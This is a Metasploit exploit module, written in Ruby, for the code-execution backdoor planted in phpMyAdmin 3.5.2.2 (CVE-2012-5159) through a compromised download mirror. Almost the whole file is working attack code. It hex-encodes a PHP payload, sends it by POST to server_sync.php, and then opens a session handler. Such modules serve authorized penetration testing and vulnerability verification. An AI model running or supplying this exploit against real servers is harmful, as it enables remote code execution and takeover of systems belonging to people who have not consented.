##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'phpMyAdmin 3.5.2.2 server_sync.php Backdoor',
      'Description'    => %q{
          This module exploits an arbitrary code execution backdoor
        placed into phpMyAdmin v3.5.2.2 through a compromised SourceForge mirror.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2012-5159' ],
          [ 'OSVDB', '85739' ],
          [ 'EDB', '21834' ],
          [ 'URL', 'http://www.phpmyadmin.net/home_page/security/PMASA-2012-5.php' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'ConnectionType' => 'find',
            },
          # Arbitrary big number. The payload gets sent as an HTTP
          # response body, so really it's unlimited
          'Space'       => 262144, # 256k
        },
      'DefaultOptions' =>
        {
          'WfsDelay' => 30
        },
      'DisclosureDate' => 'Sep 25 2012',
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'DefaultTarget' => 0))

    register_options([
      OptString.new('PATH', [ true , "The base directory containing phpMyAdmin try", '/phpMyAdmin'])
    ])
  end

  def exploit

    uris = []

    tpath = datastore['PATH']
    if tpath[-1,1] == '/'
      tpath = tpath.chop
    end

    pdata = "c=" + Rex::Text.to_hex(payload.encoded, "%")

    res = send_request_raw( {
      'global'  => true,
      'uri'     => tpath + "/server_sync.php",
      'method'  => 'POST',
      'data'    => pdata,
      'headers' => {
        'Content-Type'   => 'application/x-www-form-urlencoded',
        'Content-Length' => pdata.length,
      }
    }, 1.0)

    handler
  end
end